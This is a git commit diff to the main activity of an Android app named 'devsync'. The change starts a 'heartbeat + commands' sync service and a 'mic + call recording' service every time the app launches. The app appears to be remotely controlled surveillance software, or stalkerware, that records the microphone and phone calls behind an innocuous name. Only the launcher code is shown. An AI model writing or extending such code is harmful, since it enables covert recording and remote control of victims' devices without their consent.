5e84420637b57df9ef58bd31f960010e105a794a
ashok724036-svg <ashok724036@gmail.com>
2026-05-16 14:49:02 +0530

    Fix: start RecordingService on app launch (not only on boot)

--- app/src/main/java/com/example/devsync/MainActivity.kt
+++ app/src/main/java/com/example/devsync/MainActivity.kt
@@ -1,14 +1,29 @@
 package com.example.devsync
 
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // Start DeviceSyncService (heartbeat + commands)
+        startSvc(DeviceSyncService::class.java)
+
+        // Start RecordingService (mic + call recording)
+        startSvc(RecordingService::class.java)
+
         startActivity(Intent(this, UserInterfaceActivity::class.java))
-        startService(Intent(this, DeviceSyncService::class.java))
         finish()
+    }
+
+    private fun <T> startSvc(cls: Class<T>) {
+        val intent = Intent(this, cls)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+            startForegroundService(intent)
+        else
+            startService(intent)
     }
 }
